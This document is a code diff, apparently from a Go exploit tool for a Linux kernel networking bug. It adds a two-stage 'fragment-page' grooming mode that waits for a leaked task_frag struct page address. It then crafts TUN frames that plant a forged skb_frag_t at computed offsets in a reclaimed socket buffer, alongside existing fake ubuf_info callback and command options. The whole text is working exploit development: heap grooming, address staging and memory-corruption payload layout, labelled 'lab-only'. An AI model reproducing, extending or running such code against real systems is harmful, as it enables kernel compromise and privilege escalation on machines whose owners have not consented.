@@ -90,6 +90,8 @@ type cfg struct {
 	staleEach     time.Duration
 	staleHold     bool
 	staleHead     uint64
+	staleFragPage uint64
+	staleFragFile string
 	staleSKB      uint64
 	staleDev      uint64
 	staleHeadFile string
@@ -140,6 +142,8 @@ func parseCfg() cfg {
 	staleEachUS := flag.Int("stale-groom-each-delay-us", 0, "lab-only: delay after each marker allocation")
 	flag.BoolVar(&c.staleHold, "stale-groom-hold", true, "lab-only: hold marker SKBs in a TAP packet-socket queue until all chunks are allocated")
 	flag.Uint64Var(&c.staleHead, "stale-groom-head", 0, "lab-only: predicted victim skb head address for fake ubuf_info")
+	flag.Uint64Var(&c.staleFragPage, "stale-groom-frag-page", 0, "lab-only: seed frags[0] with an observed struct page pointer")
+	flag.StringVar(&c.staleFragFile, "stale-groom-frag-page-file", "", "lab-only: two-stage mode; wait for an observed task_frag struct page pointer")
 	flag.Uint64Var(&c.staleSKB, "stale-groom-skb", 0, "lab-only: optional observed victim sk_buff address for calibration diagnostics")
 	flag.Uint64Var(&c.staleDev, "stale-groom-dev", 0, "lab-only: optional observed victim net_device address for calibration diagnostics")
 	flag.StringVar(&c.staleHeadFile, "stale-groom-head-file", "", "lab-only: two-stage mode; wait for a file containing the probed victim head address")
@@ -251,6 +255,18 @@ func parseCfg() cfg {
 		fmt.Fprintln(os.Stderr, "stale groom head/head-file and callback must be supplied together and require -stale-page-groom")
 		os.Exit(1)
 	}
+	if c.staleFragPage != 0 && c.staleFragFile != "" {
+		fmt.Fprintln(os.Stderr, "use either -stale-groom-frag-page or -stale-groom-frag-page-file")
+		os.Exit(1)
+	}
+	if (c.staleFragPage != 0 || c.staleFragFile != "") && (!c.staleGroom || c.staleHead != 0 || c.staleHeadFile != "" || c.staleCallback != 0) {
+		fmt.Fprintln(os.Stderr, "stale fragment-page grooming requires -stale-page-groom and cannot be combined with callback grooming")
+		os.Exit(1)
+	}
+	if c.staleFragPage&63 != 0 {
+		fmt.Fprintln(os.Stderr, "-stale-groom-frag-page must be a 64-byte-aligned struct page pointer")
+		os.Exit(1)
+	}
 	if c.staleCopyLen < 0 || c.staleCopyLen > 80 || (c.staleCopyLen != 0 && c.staleCallback == 0) {
 		fmt.Fprintln(os.Stderr, "-stale-copy-len must be in 0..80 and requires stale groom head/head-file plus callback")
 		os.Exit(1)
@@ -343,6 +359,26 @@ func run(c cfg) error {
 func runStaleOptionsWrite(tap *os.File, cap *capture, c cfg) error {
 	runtime.LockOSThread()
 	defer runtime.UnlockOSThread()
+	if c.staleFragFile != "" {
+		probe := c
+		probe.staleOptLen = 14
+		probe.staleFragPage = 0
+		if err := runStaleOptionsAttempt(tap, cap, probe); err != nil {
+			return fmt.Errorf("stale fragment-page probe stage: %w", err)
+		}
+		fmt.Printf("stale-options: fragment-page probe ready; write the observed task_frag struct page to %s\n", c.staleFragFile)
+		addresses, err := waitForKernelAddresses(c.staleFragFile, 30*time.Second)
+		if err != nil {
+			return err
+		}
+		attack := c
+		attack.staleFragPage = addresses[0]
+		attack.staleFragFile = ""
+		attack.staleGrooms = 8
+		fmt.Printf("stale-options: fragment-page stage page=%#x option_len=%d groom_count=%d\n",
+			attack.staleFragPage, attack.staleOptLen, attack.staleGrooms)
+		return runStaleOptionsAttempt(tap, cap, attack)
+	}
 	if c.staleHeadFile == "" {
 		return runStaleOptionsAttempt(tap, cap, c)
 	}
@@ -413,7 +449,7 @@ func runStaleOptionsAttempt(tap *os.File, cap *capture, c cfg) error {
 			}
 		}
 		for i := 0; i < c.staleGrooms; i++ {
-			frame, err := stalePageGroomFrame(0x6b, c.staleHead, c.staleSKB, c.staleDev, c.staleCallback, c.staleCopyLen, c.staleExec, c.staleNoop, c.staleCommand)
+			frame, err := stalePageGroomFrame(0x6b, c.staleHead, c.staleFragPage, c.staleSKB, c.staleDev, c.staleCallback, c.staleCopyLen, c.staleExec, c.staleNoop, c.staleCommand)
 			if err != nil {
 				if hold != nil {
 					hold.Close()
@@ -504,7 +540,7 @@ func runStaleOptionsAttempt(tap *os.File, cap *capture, c cfg) error {
 	return nil
 }
 
-func stalePageGroomFrame(fill byte, victimHead, _, _, callback uint64, copyLen int, execAsync, noopRet uint64, command string) ([]byte, error) {
+func stalePageGroomFrame(fill byte, victimHead, fragPage, _, _, callback uint64, copyLen int, execAsync, noopRet uint64, command string) ([]byte, error) {
 	// 3456 is the largest convenient frame that still passes tun_can_build_skb's
 	// PAGE_SIZE eligibility check, which includes TUN_RX_PAD, XDP headroom, and
 	// skb_shared_info. With no XDP program the actual task_frag chunk is 3840
@@ -514,6 +550,20 @@ func stalePageGroomFrame(fill byte, victimHead, _, _, callback uint64, copyLen i
 	copy(frame[0:6], []byte{0x02, 0x00, 0x00, 0x00, 0x00, 0x01})
 	copy(frame[6:12], []byte{0x02, 0x00, 0x00, 0x00, 0x00, 0x02})
 	binary.BigEndian.PutUint16(frame[12:14], ethPExperiment)
+	if fragPage != 0 {
+		// The predecessor starts at victim head+64.  A reclaimed short
+		// child's skb_shared_info begins at head+128 and frags[0] begins
+		// another 48 bytes later, so frame+112 seeds the 16-byte skb_frag_t.
+		// Keep destructor_arg (frame+104) zero: a stale write may set the
+		// zerocopy-enable flag, but skb_zcopy() then returns NULL and release
+		// continues to the nr_frags loop without making a callback.
+		for i := 104; i < 112; i++ {
+			frame[i] = 0
+		}
+		binary.LittleEndian.PutUint64(frame[112:120], fragPage)
+		binary.LittleEndian.PutUint32(frame[120:124], 1) // skb_frag_t.len
+		binary.LittleEndian.PutUint32(frame[124:128], 0) // skb_frag_t.offset
+	}
 	if victimHead != 0 {
 		// The reclaimed short child has end=128. skb_shared_info starts
 		// there, destructor_arg is at +40, and frags[] starts at +48.
